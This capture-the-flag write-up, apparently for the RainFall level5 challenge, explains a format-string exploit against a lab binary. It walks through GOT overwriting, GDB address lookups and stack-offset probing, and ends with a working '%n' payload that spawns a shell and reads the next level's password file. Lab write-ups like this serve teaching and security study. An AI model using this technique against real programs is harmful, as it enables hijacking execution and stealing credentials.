# level5

Let's begin our initial analysis of the binary.

Here is the reconstructed C code of the binary:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void o(void) {
    system("/bin/sh");
    _exit(1);
}

void n(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);
    exit(1);
}

int main(void) {
    n();
    return 0;
}
```

We have functions `o` and `n`. The only function called from `main` is `n`. The function `o` contains the code to spawn a shell, so we must redirect execution to it.

However, because `n` calls `exit(1)` directly, the program never returns from the stack frame normally. This means we cannot simply hijack the saved return address (EIP).

Instead, we can exploit this by overwriting the entry for `exit` in the Global Offset Table (GOT) with the address of `o`.

### How PLT and GOT work

Since `exit` is a libc function, its code is resolved dynamically at runtime. To facilitate this, the system uses the Procedure Linkage Table (PLT) and the Global Offset Table (GOT).

The PLT acts as a jump table that queries the GOT for the actual memory address of the function. Unlike the PLT, the GOT resides in a writable segment of memory.

Think of it like this:
```text
[index]  [name]  [mail box number]
[0]      [samu]  [10]
[1]      [andy]  [99]
[2]      [cony]  [77]
```

We cannot change the index (the PLT), but we can change the mailbox number (the GOT entry) to point wherever we want:
```text
[PLT]    [func]  [GOT]
[0]      [samu]  [10] -> can be modified
[1]      [andy]  [99]
[2]      [cony]  [77]
```

By overwriting `exit`'s GOT entry with the address of `o`, the program will branch to `o` instead of the original exit routine when `exit(1)` is executed.

### Finding the Addresses

1. **Address of `o`:**
   Using GDB to find the address of the `o` function:
   ```text
   (gdb) info functions o
   Non-debugging symbols:
   0x080484a4  o
   ```
   The target address is `0x080484a4`. Converting it to decimal gives `134513828`.

2. **GOT entry of `exit`:**
   We disassemble `exit@plt` in GDB:
   ```text
   (gdb) disassemble exit
   Dump of assembler code for function exit@plt:
      0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
      0x080483d6 <+6>:	push   0x28
      0x080483db <+11>:	jmp    0x8048370
   End of assembler dump.
   ```
   The jump instruction redirects to `0x08049838`. This is our target GOT address.

3. **Stack Offset:**
   Let's feed multiple `%x` format specifiers:
   ```bash
   level5@RainFall:~$ ./level5
   aaaa %x %x %x %x %x %x
   aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
   ```
   `61616161` (`aaaa`) appears at the **4th** argument position.

### Building the Payload
- Target GOT Address: `0x08049838`
- Target Value: `134513828` (`0x080484a4`)
- Stack Offset: `4`

We place the 4-byte GOT address of `exit` at the beginning of our format string. We need `134513828` characters printed in total. Since the address occupies 4 bytes, we print `134513828 - 4 = 134513824` characters of padding. Then we use `%4$n` to write this count to the address at position 4.

Using `[::-1]` to write the target address in little-endian format, we build the payload command:
```bash
python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"' > payload
```

And run the exploit:
```bash
(cat payload; cat) | ./level5
```
This spawns a shell, allowing us to read the password for `level6`:
```bash
cat /home/user/level6/.pass
```
